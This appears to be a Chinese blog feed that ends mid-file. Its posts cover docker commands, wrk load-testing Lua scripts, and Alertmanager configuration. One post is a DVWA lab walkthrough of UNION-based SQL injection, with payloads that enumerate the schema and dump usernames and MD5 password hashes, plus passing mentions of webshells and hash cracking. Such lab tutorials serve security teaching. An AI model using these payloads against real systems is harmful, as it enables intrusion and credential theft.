<p><b>blkio子系统</b></p>
<ul>
<li>blkio子系统的功能是对块设备读写的速率限制,目前 blkio 子系统提供的两种控制策略，一个是权重比例方式的控制，另一个是针对 IO 带宽和 IOPS 的控制.前者是针对blkio.weight 分配权重，后者对blkio.throttle.write_iops_device 进行限制。</li>
</ul>
<p>ref </p>
<p><a href="https://www.baidu.com/link?url=ubhv7epUUNTpytivc7_ikrYX-flsGZHW9gn0REl9273xJa2YpM3kLz2wR6BqkCSMjYMZrXuyJlXQjU1bil4uja&amp;wd=&amp;eqid=e8f57cc000011018000000025833b49b" target="_blank" rel="external">Docker 百度百科</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      how to use docker quickly
    
    </summary>
    
    
      <category term="docker" scheme="https://t1ger.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>dvwa平台测试sql注入</title>
    <link href="https://t1ger.github.io/2016/11/20/dvwa%E5%B9%B3%E5%8F%B0%E6%B5%8B%E8%AF%95sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://t1ger.github.io/2016/11/20/dvwa平台测试sql注入/</id>
    <published>2016-11-20T03:28:59.000Z</published>
    <updated>2016-11-20T05:58:44.255Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。<br>本文所有演示操作都是在此环境中,本文是帮助用户了解信息安全技术、安全漏洞相关信息，不承担任何法律及连带责任</p>
<p>我们的测试环境：<br>测试平台：dvwa<br>渗透工具推荐：burpsuite<br>本次测试主要针对mysql数据库，针对不同的数据库平台，注入语句需要做相应更改</p>
<p>首先，我们此次测试的安全等级为low，先让自己有点信心吗，免的一上来就被打脸</p>
<p>sql注入利用一般有以下几个基本步骤:</p>
<ul>
<li>发现sql注入点</li>
<li>通过mysql数据库帮助，获取账户密码等敏感信息</li>
<li>上传webshell,获得一个反向链接</li>
</ul>
<p>闲言少叙，赶紧开始吧</p>
<p>一般我们先登入dvwa平台，选择Sql Injection选项，有的同学要说了，用户密码是什么呀？这个。。。，其实找个暴力破解工具解决了，如果不行问问谷歌也可以哈<br>这里我们看到一个输入框，提示我们输入用户id,这里我们输入数字1，提交后返回了用户1的信息<br>它一共返回三行数据<br>一行是我们输入的用户ID。一行是用户名，另外一行是用户别名。同时，看一下浏览器的地址栏那里，发现url成这样了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a></p>
<p>接下来我们输入2,发现url变成了<br><a href="http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#" target="_blank" rel="external">http://192.168.100.100/vulnerabilities/sqli/?id=2&amp;Submit=Submit#</a></p>
<p>接下来我们输入“’”时，页面提示错误“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1”，结果如图。看到这个结果，我们可以欣慰的知道，这个表单存在着注入漏洞。<br>之所以产生错误是因为，输入的用户ID中,单引号不是一个整数类型的，导致后端SQL查询产生了错误，可以想象一下后端SQL查询语句大概是这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;select first_name,last_name from users where user_id=”;</div></pre></td></tr></table></figure>
<p>在我们输入“’”后，sql语句就会变成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MySQL&gt; select first_name, last_name from users where user_id=”’ ;</div></pre></td></tr></table></figure></p>
<p>好了，到这里，我们可以得出这里传进去的id的值是我们可以控制的。前端的该语句是会在后端的sql服务器进行执行的，这将使sql注入变为可能</p>
<p>在我们确认了漏洞之后，就可以构造payload了。什么是payload?说白了就是一段恶意代码，以便我们能够获得数据库里面的数据。<br>我们需要确定表里边有几个字段，常用的方法有两种</p>
<ul>
<li>用order by 语句</li>
<li>用union select </li>
</ul>
<p>分析字段数的原因是我们之后需要用union select 语句获得我们需要的敏感数据。<br>由order by 语法知道，要是后面跟着的数字超出了字段数时，就会报错<br>我们构造的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; order by 1#</div><div class="line">1&apos; order by 2#</div><div class="line">1&apos; order by 3#</div></pre></td></tr></table></figure></p>
<p>当输入到3的时候，发现它报错了，也就是说字段数为2。</p>
<p>当用union select 猜测的时候也是一样，当字段数不对应的时候，它也是会发生报错的，这里直接贴出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1&apos; union select 1#</div><div class="line">1&apos; union select 1,2#</div><div class="line">1&apos; union select 1,2,3#</div></pre></td></tr></table></figure></p>
<p>准备工作都做好了，那我们开始获取数据库的敏感信息了：获取当前数据库名和用户名，构造payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&apos; union select database(),user()#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: admin</div><div class="line">Surname: admin</div><div class="line">ID: 1&apos; union select database(),user()#</div><div class="line">First name: dvwa</div><div class="line">Surname: admin@localhost</div></pre></td></tr></table></figure></p>
<p>我们可以看到当前使用的数据库为：dvwa，当前的用户名：root@localhost。<br>类似的函数还有：version() 获取当前数据库版本,@@version_compile_os获取当前操作系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select version(),@@version_compile_os#</div></pre></td></tr></table></figure></p>
<p>光获得这些信息有什么用呢，慢慢听我道来<br>我们知道mysql有个information_schema，这是一个包含了mysql数据库所有信息的“字典”，本质上还是一个database，存放着其他各个数据的信息<br>在information_schema里，有一个表tables。有一个columns……是不是有点感觉了？ tables这个表存放的是关于数据库中所有表的信息，里面有个字段叫table_name，还有个字段叫做table_schema。其中table_name是表名，table_schema表示的是这个表所在的数据库。对于columns，它有column_name，table_schema，table_name。回想一下，我们拥有的信息是数据库名。也就是说我们可以构造这样的payload来从数据库里获取一些东西。</p>
<p>构造的查询语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: guestbook</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: users</div><div class="line">Surname: 2</div></pre></td></tr></table></figure></p>
<p>出来两个表，对那个感兴趣呢？？？当然是users表啦！不是说还有一个columns表么？所以我们还需要table_name以及table_schema来查column_name。这次我们构造的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div></pre></td></tr></table></figure></p>
<p>返回如下信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user_id</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: first_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: last_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: password</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: avatar</div><div class="line">Surname: 2</div></pre></td></tr></table></figure>
<p>这么多数据，选哪个呢？？？废话，当然是user，password啦。我们再次修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select user,password from users#</div></pre></td></tr></table></figure></p>
<p>终于返回我们想看的数据了，不过貌似密码是md5加密过的，这能难倒我们么，找度娘帮忙，找一些破解md5值的网站来进行破解<br>之后返回登陆界面验证下</p>
<p>简单的SQL注入就说到这儿了，下次我们将进行DVWA里面的中级SQL注入</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言&lt;br&gt;先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。&lt;br&gt;本文所有演示
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>http压力测试工具wrk</title>
    <link href="https://t1ger.github.io/2016/11/19/http%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7wrk/"/>
    <id>https://t1ger.github.io/2016/11/19/http压力测试工具wrk/</id>
    <published>2016-11-19T08:56:36.000Z</published>
    <updated>2016-11-19T09:51:58.379Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>wrk是一款开源的压力测试工具，它没有Load Runner那么复杂，和apache的ab 一样简单上手，确比ab功能更加强大，足以应对开发过程中的性能验证了：</p>
<ul>
<li>集成了多线程设计和事件通知系统(epoll,kqueue)</li>
<li>通过lua脚本进行扩展 eg. http请求的生产、响应处理，自定义报告等</li>
</ul>
<p>下载安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># git clone https://github.com/wg/wrk.git</div><div class="line"># cd wrk/</div><div class="line"># make -j8</div><div class="line"># ./wrk  -t12 -c100 -d10s http://www.baidu.com</div></pre></td></tr></table></figure></p>
<p>要测试的网站当然是百度了，据说百度是局域网看网络通不通的首选哦，没有之一<br>我们启动 12 个线程，100 个并发，持续运行 10 秒。线程数一般设置为cpu核数的2-4倍,如果想看响应时间的分布情况可以加上–latency参数</p>
<p>[root@localhost wrk]# ./wrk  -t12 -c100 -d10s <a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a><br>Running 10s test @ <a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a><br>  12 threads and 100 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency   367.77ms  417.94ms   1.97s    84.84%<br>    Req/Sec     9.79      6.43    40.00     65.23%<br>  760 requests in 10.12s, 11.42MB read<br>  Socket errors: connect 0, read 0, write 0, timeout 41<br>Requests/sec:     75.13<br>Transfer/sec:      1.13MB</p>
<p>Latency: 可以理解为响应时间, 有平均值, 标准偏差, 最大值, 正负一个标准差占比<br>Requests/sec 就是最基本的指标：每秒处理的请求数(QPS)<br>Thread Stats 是线程执行情况，包括延迟、每秒处理个数，其中的 Avg 和 Max 很好理解，是平均值和最大值，Stdev 是标准差。<br>一般我们来说我们主要关注平均值和最大值. 标准差如果太大说明样本本身离散程度比较高. 有可能系统性能波动很大</p>
<p>测试场景-Post<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># cat post.lua</div><div class="line">wrk.method = &quot;POST&quot;  </div><div class="line">wrk.body   = &quot;foo=bar&amp;baz=quux&quot;  </div><div class="line">wrk.headers[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;  </div><div class="line"></div><div class="line"># ./wrk -t12 -c100 -d30s -T30s --script=post.lua --latency http://www.baidu.com</div></pre></td></tr></table></figure></p>
<p>复合场景-lua 实现访问多个 url.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">counter = 1</div><div class="line"></div><div class="line">math.randomseed(os.time())</div><div class="line">math.random(); math.random(); math.random()</div><div class="line"></div><div class="line">function file_exists(file)</div><div class="line">  local f = io.open(file, &quot;rb&quot;)</div><div class="line">  if f then f:close() end</div><div class="line">  return f ~= nil</div><div class="line">end</div><div class="line"></div><div class="line">function shuffle(paths)</div><div class="line">  local j, k</div><div class="line">  local n = #paths</div><div class="line">  for i = 1, n do</div><div class="line">    j, k = math.random(n), math.random(n)</div><div class="line">    paths[j], paths[k] = paths[k], paths[j]</div><div class="line">  end</div><div class="line">  return paths</div><div class="line">end</div><div class="line"></div><div class="line">function non_empty_lines_from(file)</div><div class="line">  if not file_exists(file) then return &#123;&#125; end</div><div class="line">  lines = &#123;&#125;</div><div class="line">  for line in io.lines(file) do</div><div class="line">    if not (line == &apos;&apos;) then</div><div class="line">      lines[#lines + 1] = line</div><div class="line">    end</div><div class="line">  end</div><div class="line">  return shuffle(lines)</div><div class="line">end</div><div class="line"></div><div class="line">paths = non_empty_lines_from(&quot;paths.txt&quot;)</div><div class="line"></div><div class="line">if #paths &lt;= 0 then</div><div class="line">  print(&quot;multiplepaths: No paths found. You have to create a file paths.txt with one path per line&quot;)</div><div class="line">  os.exit()</div><div class="line">end</div><div class="line"></div><div class="line">print(&quot;multiplepaths: Found &quot; .. #paths .. &quot; paths&quot;)</div><div class="line"></div><div class="line">request = function()</div><div class="line">    path = paths[counter]</div><div class="line">    counter = counter + 1</div><div class="line">    if counter &gt; #paths then</div><div class="line">      counter = 1</div><div class="line">    end</div><div class="line">    return wrk.format(nil, path)</div><div class="line">end</div></pre></td></tr></table></figure>
<p>场景-cookie<br>我们需要模拟一些通过 cookie 传递数据的场景. wrk 并没有特殊支持, 可以通过 wrk.headers[“Cookie”]=”xxxxx”实现. 例子是取 Response的cookie作为后续请求的cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function getCookie(cookies, name)</div><div class="line">  local start = string.find(cookies, name .. &quot;=&quot;)</div><div class="line"></div><div class="line">  if start == nil then</div><div class="line">    return nil</div><div class="line">  end</div><div class="line"></div><div class="line">  return string.sub(cookies, start + #name + 1, string.find(cookies, &quot;;&quot;, start) - 1)</div><div class="line">end</div><div class="line"></div><div class="line">response = function(status, headers, body)</div><div class="line">  local token = getCookie(headers[&quot;Set-Cookie&quot;], &quot;token&quot;)</div><div class="line">  </div><div class="line">  if token ~= nil then</div><div class="line">    wrk.headers[&quot;Cookie&quot;] = &quot;token=&quot; .. token</div><div class="line">  end</div><div class="line">end</div></pre></td></tr></table></figure>
<p>通过源码可以看到 wrk 对象的源代码有如下属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">local wrk = &#123;</div><div class="line">   scheme  = &quot;http&quot;,</div><div class="line">   host    = &quot;localhost&quot;,</div><div class="line">   port    = nil,</div><div class="line">   method  = &quot;GET&quot;,</div><div class="line">   path    = &quot;/&quot;,</div><div class="line">   headers = &#123;&#125;,</div><div class="line">   body    = nil,</div><div class="line">   thread  = nil,</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>schema, host, port, path 这些, 我们一般都是通过 wrk 命令行参数来指定,wrk 还提供了几个lua的hook函数：<br>setup //在目标 IP 地址已经解析完, 并且所有 thread 已经生成, 但是还没有开始时被调用. 每个线程执行一次这个函数.可以通过thread:get(name),  thread:set(name, value)设置线程级别的变量<br>init  //每次请求发送之前被调用<br>delay //返回一个数值, 在这次请求执行完以后延迟多长时间执行下一个请求. 可以对应 thinking time 的场景<br>request  //函数可以每次请求之前修改本次请求的属性. 返回一个字符串. 这个函数要慎用, 会影响测试端性能<br>response //每次请求返回以后被调用. 可以根据响应内容做特殊处理, 比如遇到特殊响应停止执行测试, 或输出到控制台等等<br>done   //在所有请求执行完以后调用, 一般用于自定义统计结果</p>
<p>已经迫不及待了吧，让我们看看源码给的例子吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">local counter = 1</div><div class="line">local threads = &#123;&#125;</div><div class="line"></div><div class="line">function setup(thread)</div><div class="line">   thread:set(&quot;id&quot;, counter)</div><div class="line">   table.insert(threads, thread)</div><div class="line">   counter = counter + 1</div><div class="line">end</div><div class="line"></div><div class="line">function init(args)</div><div class="line">   requests  = 0</div><div class="line">   responses = 0</div><div class="line"></div><div class="line">   local msg = &quot;thread %d created&quot;</div><div class="line">   print(msg:format(id))</div><div class="line">end</div><div class="line"></div><div class="line">function request()</div><div class="line">   requests = requests + 1</div><div class="line">   return wrk.request()</div><div class="line">end</div><div class="line"></div><div class="line">function response(status, headers, body)</div><div class="line">   responses = responses + 1</div><div class="line">end</div><div class="line"></div><div class="line">function done(summary, latency, requests)</div><div class="line">   for index, thread in ipairs(threads) do</div><div class="line">      local id        = thread:get(&quot;id&quot;)</div><div class="line">      local requests  = thread:get(&quot;requests&quot;)</div><div class="line">      local responses = thread:get(&quot;responses&quot;)</div><div class="line">      local msg = &quot;thread %d made %d requests and got %d responses&quot;</div><div class="line">      print(msg:format(id, requests, responses))</div><div class="line">   end</div><div class="line">end</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/wg/wrk" target="_blank" rel="external">wrk 官网</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言&lt;br&gt;wrk是一款开源的压力测试工具，它没有Load Runner那么复杂，和apache的ab 一样简单上手，确比ab功能更加强大，足以应对开发过程中的性能验证了：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成了多线程设计和事件通知系统(epoll,kqueue)&lt;/li&gt;
&lt;l
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker日常命令</title>
    <link href="https://t1ger.github.io/2016/11/19/docker%E6%97%A5%E5%B8%B8%E5%91%BD%E4%BB%A4/"/>
    <id>https://t1ger.github.io/2016/11/19/docker日常命令/</id>
    <published>2016-11-19T05:35:24.000Z</published>
    <updated>2016-11-19T05:59:18.166Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>启动容器并启动bash(交互)：<br>docker run -i -t <image_name container_id=""> /bin/bash</image_name></p>
</li>
<li><p>启动容器以后台方式运行<br>docker run -d -it <image_name container_id=""></image_name></p>
</li>
<li><p>启动容器并映射对外端口<br>docker run -p <host_ip>:<container_ip> <image> <cmd><br>docker run -d -p 80:80 -p 2003:2003 -p 8125:8125/udp -p 8126:8126 –name jlachowski-grafana-dashboard jlachowski/grafana-graphite-statsd</cmd></image></container_ip></host_ip></p>
</li>
</ul>
<ul>
<li><p>进入容器，同时运行bash<br>docker exec -t -i <id container_name=""> /bin/bash</id></p>
</li>
<li><p>查看容器日志和实时输<br>docker logs <id container_name=""><br>docker logs -f <id container_name=""></id></id></p>
</li>
<li><p>查看当前运行的container<br>docker ps<br>docker ps |less -S </p>
</li>
<li><p>显示容器的进程信息<br>docker top id/container_name</p>
</li>
<li><p>在容器中安装新程序<br>docker run image_name yum install packagename -y</p>
</li>
<li><p>从容器拷贝文件/目录到本地路径<br>docker cp <id container_name="">:/container_path to_path</id></p>
</li>
<li><p>保存对容器的修改<br>docker commit id new_image_name</p>
</li>
<li><p>删除单个或所有<br>docker rm id/container_name<br>docker rm `docker ps -a -q`</p>
</li>
<li><p>停止、启动、杀死、重启容器<br>docker <stop id="" start="" kill="" restart=""></stop>  id/container_name</p>
</li>
</ul>
<ul>
<li>操作镜像<br>docker images //列出<br>docker search images //搜索<br>docker pull image_name // 下载<br>docker rmi image_name  // 删除一个或多个<br>docker history image_name //镜像历史<br>docker push new_image_name //发布镜像</li>
</ul>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;启动容器并启动bash(交互)：&lt;br&gt;docker run -i -t &lt;image_name container_id=&quot;&quot;&gt; /bin/bash&lt;/image_name&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;启动容器以后台方式运行&lt;br&gt;docker 
    
    </summary>
    
    
      <category term="docker centos" scheme="https://t1ger.github.io/tags/docker-centos/"/>
    
  </entry>
  
  <entry>
    <title>Prometheus的信使</title>
    <link href="https://t1ger.github.io/2016/11/19/Prometheus%E7%9A%84%E4%BF%A1%E4%BD%BF/"/>
    <id>https://t1ger.github.io/2016/11/19/Prometheus的信使/</id>
    <published>2016-11-19T02:27:03.000Z</published>
    <updated>2016-11-19T02:53:06.375Z</updated>
    
    <content type="html"><![CDATA[<p>前言</p>
<p>今天介绍下Prometheus的好基友Alertmanager，让我们看下官方是怎么介绍的呢</p>
<p>The Alertmanager handles alerts sent by client applications such as the Prometheus server. It takes care of deduplicating, grouping, and routing them to the correct receiver integrations such as email, PagerDuty, or OpsGenie. It also takes care of silencing and inhibition of alerts</p>
<p>下面让我们详细解释下</p>
<p>grouping<br>分组是指当出现问题时，Alertmanager会收到一个单一的通知，比如当系统宕机时，很有可能成百上千的警报会同时生成，这种机制在某节点服务器中断中特别有用。</p>
<p>inhibition of alerts<br>抑制是指当报警发出后，停止重复发送此警报引发的其他错误的报警机制。<br>场景：<br>当网络交换机节点故障，可以配置Alertmanager忽略由该警报触发而产生的所有其他警报，这可以防止通知数百或数千与此问题不相关的其他警报。</p>
<p>silencing<br>沉默是一种简单的特定时间静音提醒的机制。一种沉默是通过匹配器来配置，就像路由树一样。传入的警报会匹配RE，如果匹配，将不会为此警报发送通知。</p>
<p>设置警报和通知的主要步骤</p>
<ul>
<li>安装配置Alertmanager</li>
<li>配置Prometheus通过 -alertmanager.url与Alertmanager通信</li>
<li>在Prometheus中创建报警规则</li>
</ul>
<p>让我们来了解下它的架构吧，如下图:<br><img src="https://raw.githubusercontent.com/prometheus/alertmanager/4e6695682acd2580773a904e4aa2e3b927ee27b7/doc/arch.jpg" alt="Alertmanager架构图"></p>
<p>这里我简单聊聊配置文件，贴出官网的一个示例，具体详细配置，请移步<a href="https://github.com/prometheus/alertmanager" target="_blank" rel="external">这里</a><br>Alertmanager通过命令行flag和一个配置文件进行配置。命令行flag配置不变的系统参数、配置文件定义的禁止规则、通知路由和通知接收器。<br>Alertmanager在运行时加载配置，如果不能很好的形成新的配置，更改将不会被应用，并记录错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div></pre></td><td class="code"><pre><div class="line">global:</div><div class="line">  # The smarthost and SMTP sender used for mail notifications.</div><div class="line">  smtp_smarthost: &apos;localhost:25&apos;</div><div class="line">  smtp_from: &apos;alertmanager@example.org&apos;</div><div class="line"></div><div class="line"># The root route on which each incoming alert enters.</div><div class="line">route:</div><div class="line">  # The root route must not have any matchers as it is the entry point for</div><div class="line">  # all alerts. It needs to have a receiver configured so alerts that do not</div><div class="line">  # match any of the sub-routes are sent to someone.</div><div class="line">  receiver: &apos;team-X-mails&apos;</div><div class="line"></div><div class="line">  # The labels by which incoming alerts are grouped together. For example,</div><div class="line">  # multiple alerts coming in for cluster=A and alertname=LatencyHigh would</div><div class="line">  # be batched into a single group.</div><div class="line">  group_by: [&apos;alertname&apos;, &apos;cluster&apos;]</div><div class="line"></div><div class="line">  # When a new group of alerts is created by an incoming alert, wait at</div><div class="line">  # least &apos;group_wait&apos; to send the initial notification.</div><div class="line">  # This way ensures that you get multiple alerts for the same group that start</div><div class="line">  # firing shortly after another are batched together on the first</div><div class="line">  # notification.</div><div 